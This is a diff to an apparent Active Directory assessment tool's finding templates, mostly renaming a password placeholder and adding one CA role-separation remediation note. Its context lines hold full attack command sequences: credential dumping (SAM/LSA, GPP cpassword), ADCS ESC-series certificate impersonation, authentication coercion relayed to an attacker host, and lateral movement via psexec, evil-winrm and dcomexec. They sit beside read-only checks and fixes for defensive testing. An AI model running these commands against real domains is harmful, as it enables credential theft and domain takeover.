@@ -4287,7 +4287,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Find and pull GPP XML files from SYSVOL (normally requires an authenticated "
             "domain user; an unauthenticated null/guest SMB session can expose it too):\n"
-            "nxc smb {dc_ip} -u <user> -p <pass> -M gpp_password\n"
+            "nxc smb {dc_ip} -u <user> -p <password> -M gpp_password\n"
             "#   (or manually) browse \\\\{domain}\\SYSVOL\\{domain}\\Policies\\...\\ "
             "for Groups.xml / Services.xml / ScheduledTasks.xml / DataSources.xml / "
             "Printers.xml / Drives.xml and read the cpassword attribute, then "
@@ -4306,7 +4306,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only SYSVOL scan for GPP files carrying a cpassword "
             "attribute, no decryption performed:\n"
-            "nxc smb {dc_ip} -u <user> -p <pass> -M gpp_password\n"
+            "nxc smb {dc_ip} -u <user> -p <password> -M gpp_password\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policy-preferences"
         ),
         "remediation": (
@@ -4333,7 +4333,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Hunt shares for files that look like they carry credentials:\n"
-            "nxc smb {dc_ip} -u <user> -p <pass> -M spider_plus --pattern "
+            "nxc smb {dc_ip} -u <user> -p <password> -M spider_plus --pattern "
             "'*pass*,*cred*,*.kdbx,*.config,*.xml'\n"
             "#   (or, where allowed, an unauthenticated null/guest session) "
             "smbclient -N //{dc_ip}/<share>\n"
@@ -4390,7 +4390,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Route 1 - remote registry hive dump (recover local SAM + LSA secrets, "
             "incl. the DC machine-account key):\n"
-            "nxc smb {dc_ip} -u <user> -p <pass> --sam --lsa\n"
+            "nxc smb {dc_ip} -u <user> -p <password> --sam --lsa\n"
             "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass "
             "{domain}/<user>@<dc_fqdn>\n"
             "# Route 2 - read ntds.dit via a shadow copy, then extract offline.\n"
@@ -4414,7 +4414,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only enumeration of Backup Operators membership over LDAP, no "
             "privilege exercised:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> --groups 'Backup Operators'\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> --groups 'Backup Operators'\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds"
         ),
         "remediation": (
@@ -4474,7 +4474,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only: pull the domain password and lockout policy so you know "
             "the safe spray window before testing anything:\n"
-            "nxc smb {dc_ip} -u <user> -p <pass> --pass-pol\n"
+            "nxc smb {dc_ip} -u <user> -p <password> --pass-pol\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/spraying"
         ),
         "remediation": (
@@ -4567,7 +4567,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Read the description/info attribute of every account over LDAP and "
             "look for anything password-shaped:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -M user-desc\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -M user-desc\n"
             "#   (or a raw LDAP read of the same attributes):\n"
             'ldapsearch -x -H ldap://{dc_ip} -b "<baseDN>" "(description=*)" '
             "sAMAccountName description info\n"
@@ -4584,7 +4584,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only read of the description/info attributes, no authentication "
             "attempt made against recovered values:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -M user-desc\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -M user-desc\n"
             "# Reference: https://www.thehacker.recipes/ad/recon/ldap"
         ),
         "remediation": (
@@ -5151,6 +5151,13 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "administrators retain them.",
             "Separate the certificate-manager (officer) role from ordinary users "
             "and restrict it to a dedicated, monitored group.",
+            "As an alternative safeguard, once the two roles sit with separate "
+            "accounts, enable role separation on {target} (the "
+            "RoleSeparationEnabled CA setting, applied on a Certificate Services "
+            "restart). The CA then refuses any account holding both CA "
+            "Administrator and Certificate Manager, so ManageCA cannot be turned "
+            "into issuing a certificate by the same account. Removing ManageCA "
+            "from whoever should not hold it remains the primary fix.",
             "Review the CA policy flags (certutil -getreg policy\\EditFlags) for "
             "any change an attacker with ManageCA could have made, in particular "
             "EDITF_ATTRIBUTESUBJECTALTNAME2, and revert it.",
@@ -5213,10 +5220,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Enumerate ADCS and confirm the NO_SECURITY_EXTENSION template:\n"
-            "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# With control of a victim UPN, enroll and authenticate as the victim:\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template}\n"
             "certipy auth -pfx <victim>.pfx -dc-ip {dc_ip}"
         ),
@@ -5236,7 +5243,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration; confirm {template} is flagged ESC9 (no "
             "certificate requested):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
         ),
@@ -5275,10 +5282,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Enumerate ADCS and DC mapping configuration:\n"
-            "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# After setting the victim UPN, enroll and authenticate as the victim:\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template}\n"
             "certipy auth -pfx <victim>.pfx -dc-ip {dc_ip}"
         ),
@@ -5295,7 +5302,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration reports the DC mapping weakness (nothing "
             "changed):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
         ),
@@ -5333,12 +5340,12 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Confirm the CA RPC endpoint accepts unencrypted requests (ESC11):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Relay coerced authentication to the CA RPC (ICPR) endpoint:\n"
             "ntlmrelayx.py -t rpc://<ca_host> -rpc-mode ICPR -icpr-ca-name "
             "<ca_name> -smb2support\n"
-            "coercer coerce -u <user> -p <pass> -t {dc_ip} -l <attacker_ip>\n"
+            "coercer coerce -u <user> -p <password> -t {dc_ip} -l <attacker_ip>\n"
             "certipy auth -pfx dc.pfx -dc-ip {dc_ip}"
         ),
         "verify_windows": (
@@ -5352,7 +5359,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration reports the ICPR encryption state under "
             "the CA (no relay performed):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
         ),
@@ -5432,11 +5439,11 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Enumerate ADCS and confirm the OID-to-group link on the template:\n"
-            "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Enroll from the ESC13 template, then PKINIT to get a TGT carrying "
             "the linked group SID:\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template}\n"
             "certipy auth -pfx {executing_principal}.pfx -dc-ip {dc_ip}"
         ),
@@ -5453,7 +5460,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration; confirm the OID-to-group linkage on "
             "{template} (no certificate requested):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
         ),
@@ -5494,11 +5501,11 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Enumerate ADCS and confirm the SAN-mapping template + weak "
             "altSecurityIdentities:\n"
-            "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Where the victim has (or can be given) a weak altSecurityIdentities "
             "mapping, enroll and authenticate as the victim:\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template}\n"
             "certipy auth -pfx {target_identity}.pfx -dc-ip {dc_ip}"
         ),
@@ -5514,7 +5521,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration that lists the ESC14 exposure without "
             "requesting a certificate:\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
         ),
@@ -5559,12 +5566,12 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Enumerate ADCS and confirm the V1 enrollee-supplies-subject template:\n"
-            "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Method A (Schannel / Pass-the-Certificate): request a cert injecting a\n"
             "# Client Authentication application policy + the victim's UPN, then bind\n"
             "# to LDAPS with it and perform the LDAP takeover (e.g. grant DCSync):\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template} -upn administrator@{domain} "
             "-application-policies 'Client Authentication'\n"
             "passthecert.py -action modify_user -crt administrator.crt "
@@ -5572,10 +5579,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "-target administrator -elevate\n"
             "# Method B (on-behalf-of enrollment agent): request an enrollment-agent\n"
             "# cert, use it to enroll on behalf of the victim, then PKINIT:\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template} "
             "-application-policies 'Certificate Request Agent'\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template User -on-behalf-of '{domain}\\administrator' "
             "-pfx {executing_principal}.pfx\n"
             "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}"
@@ -5595,7 +5602,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration; confirm {template} is flagged ESC15 (no "
             "certificate requested):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
         ),
@@ -5635,11 +5642,11 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Enumerate ADCS; ESC16 is reported as a CA-wide missing SID "
             "extension:\n"
-            "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# With a controllable/weak-mapped victim, enroll and authenticate as "
             "them:\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template}\n"
             "certipy auth -pfx <victim>.pfx -dc-ip {dc_ip}"
         ),
@@ -5655,7 +5662,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration reports the CA-wide missing SID extension "
             "(no certificate requested):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-authorities"
         ),
@@ -5695,10 +5702,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Enumerate ADCS and confirm the server-auth template is enrollable:\n"
-            "certipy find -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Request a server-auth cert for a target service identity:\n"
-            "certipy req -u {executing_principal}@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy req -u {executing_principal}@{domain} -p <password> -dc-ip {dc_ip} "
             "-ca <ca_name> -template {template}\n"
             "# The issued cert is then used to impersonate the service / stand up a "
             "rogue TLS endpoint (out-of-band)."
@@ -5715,7 +5722,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration; confirm {template} exposes a server-auth "
             "enrollment surface (no certificate requested):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/certificate-templates"
         ),
@@ -5769,7 +5776,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Exploitation (deferred, lab-only) injects the cdc / rmd request "
             "attributes so the CA chases an attacker host acting as a DC, then "
             "PKINIT -> DCSync. Public proof-of-concept and research:\n"
-            "#   python3 certighost_poc.py -u <user>@example.local -p '<pass>' "
+            "#   python3 certighost_poc.py -u <user>@example.local -p '<password>' "
             "-dc-ip {dc_ip} -ca '<ca_name>' -rogue-dc <attacker_host>\n"
             "# Reference: https://kudelskisecurity.com/research/certighost"
         ),
@@ -5785,7 +5792,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ADCS enumeration that reads the CA EditFlags (no "
             "certificate requested):\n"
-            "certipy find -u <user>@example.local -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@example.local -p <password> -dc-ip {dc_ip} "
             "-stdout\n"
             "# Reference: https://kudelskisecurity.com/research/certighost"
         ),
@@ -5830,9 +5837,9 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Coerce the target over MS-EFSRPC to authenticate to your listener:\n"
-            "coercer coerce -u <user> -p <pass> -t {target_hostname} -l <attacker_ip> "
+            "coercer coerce -u <user> -p <password> -t {target_hostname} -l <attacker_ip> "
             "--filter-method-name EfsRpc\n"
-            "#   (or the standalone PoC)  petitpotam.py -u <user> -p <pass> "
+            "#   (or the standalone PoC)  petitpotam.py -u <user> -p <password> "
             "<attacker_ip> {target}\n"
             "# Pair with a relay to ADCS web enrollment (ESC8) to obtain a cert as "
             "the victim machine:\n"
@@ -5852,7 +5859,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Enumerate the coercion methods the target still exposes (a dry-run "
             "that does not complete a relay):\n"
-            "coercer scan -u <user> -p <pass> -t {target_hostname} -l <attacker_ip>\n"
+            "coercer scan -u <user> -p <password> -t {target_hostname} -l <attacker_ip>\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr"
         ),
         "remediation": (
@@ -5891,10 +5898,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Coerce the target's Print Spooler to authenticate to your listener:\n"
-            "coercer coerce -u <user> -p <pass> -t {target_hostname} -l <attacker_ip> "
+            "coercer coerce -u <user> -p <password> -t {target_hostname} -l <attacker_ip> "
             "--filter-method-name RpcRemoteFindFirstPrinterChangeNotification\n"
             "#   (or the standalone PoC)  printerbug.py "
-            "'{domain}/<user>:<pass>@{target_hostname}' <attacker_ip>\n"
+            "'{domain}/<user>:<password>@{target_hostname}' <attacker_ip>\n"
             "# Pair with a relay (e.g. to ADCS web enrollment, ESC8):\n"
             "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
             "--adcs --template DomainController"
@@ -5911,7 +5918,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Enumerate whether the target still exposes the spooler coercion "
             "method (dry run, no relay):\n"
-            "coercer scan -u <user> -p <pass> -t {target_hostname} -l <attacker_ip>\n"
+            "coercer scan -u <user> -p <password> -t {target_hostname} -l <attacker_ip>\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn"
         ),
         "remediation": (
@@ -5948,9 +5955,9 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Coerce the target over MS-DFSNM to authenticate to your listener:\n"
-            "coercer coerce -u <user> -p <pass> -t {target_hostname} -l <attacker_ip> "
+            "coercer coerce -u <user> -p <password> -t {target_hostname} -l <attacker_ip> "
             "--filter-method-name NetrDfs\n"
-            "#   (or the standalone PoC)  dfscoerce.py -u <user> -p <pass> "
+            "#   (or the standalone PoC)  dfscoerce.py -u <user> -p <password> "
             "-d {domain} <attacker_ip> {target}\n"
             "# Pair with a relay (e.g. to ADCS web enrollment, ESC8):\n"
             "ntlmrelayx.py -t http://<ca_host>/certsrv/certfnsh.asp -smb2support "
@@ -5967,7 +5974,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Enumerate whether the target still exposes the DFSNM coercion methods "
             "(dry run, no relay):\n"
-            "coercer scan -u <user> -p <pass> -t {target_hostname} -l <attacker_ip>\n"
+            "coercer scan -u <user> -p <password> -t {target_hostname} -l <attacker_ip>\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm"
         ),
         "remediation": (
@@ -6012,7 +6019,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "--adcs --template DomainController\n"
             "# 2) Coerce the target (any of EFSRPC / RPRN / DFSNM) to auth to the "
             "relay:\n"
-            "coercer coerce -u <user> -p <pass> -t {target_hostname} -l <attacker_ip>\n"
+            "coercer coerce -u <user> -p <password> -t {target_hostname} -l <attacker_ip>\n"
             "# 3) Authenticate with the issued certificate to recover a TGT / NT "
             "hash:\n"
             "certipy auth -pfx dc.pfx -dc-ip {dc_ip}"
@@ -6029,9 +6036,9 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Enumerate the CA enrollment endpoints and the target's coercion "
             "methods (read-only, no relay completed):\n"
-            "certipy find -u <user>@{domain} -p <pass> -dc-ip {dc_ip} "
+            "certipy find -u <user>@{domain} -p <password> -dc-ip {dc_ip} "
             "-vulnerable -stdout\n"
-            "coercer scan -u <user> -p <pass> -t {target_hostname} -l <attacker_ip>\n"
+            "coercer scan -u <user> -p <password> -t {target_hostname} -l <attacker_ip>\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints"
         ),
         "remediation": (
@@ -6133,7 +6140,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Detect the MachineAccountQuota and patch prerequisites "
             "(non-destructive):\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -M maq\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -M maq\n"
             "# Weaponised exploitation (creates + renames + deletes a machine "
             "account; coordinate with the client first):\n"
             "impacket-getST -spn 'cifs/{target_hostname}' -impersonate administrator "
@@ -6151,7 +6158,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read the machine-account quota (the noPac prerequisite) without "
             "exploiting:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -M maq\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -M maq\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing"
         ),
         "remediation": (
@@ -6245,8 +6252,8 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Non-destructive check that the spooler is running and remotely "
             "reachable:\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -M spooler\n"
-            "#   (or)  rpcdump.py '{domain}/<user>:<pass>@{target_hostname}' | grep -i "
+            "nxc smb {target_hostname} -u <user> -p <password> -M spooler\n"
+            "#   (or)  rpcdump.py '{domain}/<user>:<password>@{target_hostname}' | grep -i "
             "'MS-RPRN\\|spoolss'\n"
             "# Weaponised exploitation loads a driver into a SYSTEM service and is "
             "disruptive; coordinate with the client before running any exploit."
@@ -6263,7 +6270,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Non-destructive check that the target still exposes the spooler "
             "interface (no exploitation):\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -M spooler\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -M spooler\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/print-spooler-service"
         ),
         "remediation": (
@@ -6309,10 +6316,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Prove local admin by executing as SYSTEM (pick the quietest transport):\n"
             "impacket-wmiexec -k -no-pass {domain}/<user>@{target_hostname}   # WMI, Event 4688\n"
-            "#   (or)  impacket-psexec {domain}/<user>:<pass>@{target_hostname}   # SCM service, Event 7045 (loud)\n"
+            "#   (or)  impacket-psexec {domain}/<user>:<password>@{target_hostname}   # SCM service, Event 7045 (loud)\n"
             "# Confirm admin + harvest secrets from a low-noise probe:\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}   # a 'Pwn3d!' marker == local admin\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain} --sam --lsa"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain}   # a 'Pwn3d!' marker == local admin\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain} --sam --lsa"
         ),
         "verify_windows": (
             "List the local Administrators group on {target} and expand nested "
@@ -6320,13 +6327,13 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "Invoke-Command -ComputerName {target_hostname} -ScriptBlock "
             "{ Get-LocalGroupMember -Group 'Administrators' }\n"
             "# Trace a domain group that is nested into local Administrators via GPO:\n"
-            "Get-ADGroupMember -Identity '<workstation-admins-group>' -Recursive |\n"
+            "Get-ADGroupMember -Identity '{source_group}' -Recursive |\n"
             "  Select-Object name, objectClass"
         ),
         "verify_linux": (
             "Confirm the admin relationship without dumping anything: the 'Pwn3d!' "
             "marker is printed only when the account is a local administrator:\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain}\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
         ),
         "remediation": (
@@ -6358,9 +6365,9 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Confirm RDP is reachable and the account can log on interactively:\n"
-            "nxc rdp {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == interactive logon allowed\n"
+            "nxc rdp {target_hostname} -u <user> -p <password> -d {domain}   # 'Pwn3d!' == interactive logon allowed\n"
             "# Open the session from a Linux vantage:\n"
-            "xfreerdp /v:{target_hostname} /u:<user> /p:<pass> /d:{domain} /cert:ignore"
+            "xfreerdp /v:{target_hostname} /u:<user> /p:<password> /d:{domain} /cert:ignore"
         ),
         "verify_windows": (
             "List who may log on via RDP: the local Remote Desktop Users group "
@@ -6374,7 +6381,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Non-destructive check that the account is permitted an interactive RDP "
             "logon (no session opened):\n"
-            "nxc rdp {target_hostname} -u <user> -p <pass> -d {domain}\n"
+            "nxc rdp {target_hostname} -u <user> -p <password> -d {domain}\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
         ),
         "remediation": (
@@ -6406,10 +6413,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Confirm WinRM access and command execution:\n"
-            "nxc winrm {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == remote exec allowed\n"
-            "nxc winrm {target_hostname} -u <user> -p <pass> -d {domain} -x 'whoami /all'\n"
+            "nxc winrm {target_hostname} -u <user> -p <password> -d {domain}   # 'Pwn3d!' == remote exec allowed\n"
+            "nxc winrm {target_hostname} -u <user> -p <password> -d {domain} -x 'whoami /all'\n"
             "# Or open an interactive remote shell:\n"
-            "evil-winrm -i {target_hostname} -u <user> -p <pass>"
+            "evil-winrm -i {target_hostname} -u <user> -p <password>"
         ),
         "verify_windows": (
             "List who may connect over WinRM: the local Remote Management Users "
@@ -6424,7 +6431,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Non-destructive check that the account is permitted a WinRM session "
             "(no command run):\n"
-            "nxc winrm {target_hostname} -u <user> -p <pass> -d {domain}\n"
+            "nxc winrm {target_hostname} -u <user> -p <password> -d {domain}\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/lateral-movement"
         ),
         "remediation": (
@@ -6456,7 +6463,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Execute a command through a DCOM object on the target (admin required):\n"
-            "impacket-dcomexec -object MMC20 {domain}/<user>:<pass>@{target_hostname} 'whoami'\n"
+            "impacket-dcomexec -object MMC20 {domain}/<user>:<password>@{target_hostname} 'whoami'\n"
             "#   (or)  impacket-dcomexec -object ShellWindows -k -no-pass {domain}/<user>@{target_hostname} 'whoami'"
         ),
         "verify_windows": (
@@ -6470,7 +6477,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Confirm remote code-execution reach over the target (admin marker), "
             "read-only:\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == exec-capable\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain}   # 'Pwn3d!' == exec-capable\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/dcom"
         ),
         "remediation": (
@@ -6508,7 +6515,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         # user) and printed ``<target-hostname>`` where the scan knew the host.
         "manual": (
             "# Enumerate active sessions to find which privileged user is logged on:\n"
-            "nxc smb {source_hostname} -u <user> -p <pass> -d {domain} --loggedon-users\n"
+            "nxc smb {source_hostname} -u <user> -p <password> -d {domain} --loggedon-users\n"
             "# With admin on the host, register a task under that user's session to\n"
             "# impersonate them (Task Scheduler RPC over SMB):\n"
             "impacket-atexec -k -no-pass {domain}/<user>@{source_hostname} 'whoami'"
@@ -6524,7 +6531,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Read-only enumeration of who is currently logged on to the host:\n"
-            "nxc smb {source_hostname} -u <user> -p <pass> -d {domain} --loggedon-users\n"
+            "nxc smb {source_hostname} -u <user> -p <password> -d {domain} --loggedon-users\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
         ),
         "remediation": (
